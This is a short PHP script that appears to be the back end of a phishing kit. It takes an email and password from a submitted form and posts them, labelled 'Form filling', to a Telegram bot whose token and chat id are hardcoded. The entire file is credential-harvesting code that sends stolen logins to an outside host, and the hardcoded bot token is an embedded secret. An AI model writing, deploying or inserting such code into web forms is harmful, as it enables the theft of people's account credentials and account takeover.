<?php
define('BOT_URL', 'https://api.telegram.org/bot759355375:AAGoaBq7UDpRfeb4Lq458YZspjZ1OVykgpY/');

$chat_id = '469750202';

$msg = "Form filling:\n\nEmail: $email\nPassword: $password\n";

$url = BOT_URL . 'sendMessage';
$data = [
	'chat_id' => $chat_id,
	'text' => $msg,
];
$options = array('http' => array('method' => 'POST', 'header' => "Content-Type:application/x-www-form-urlencoded\r\n", 'content' => http_build_query($data)));
$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

echo $result;
?>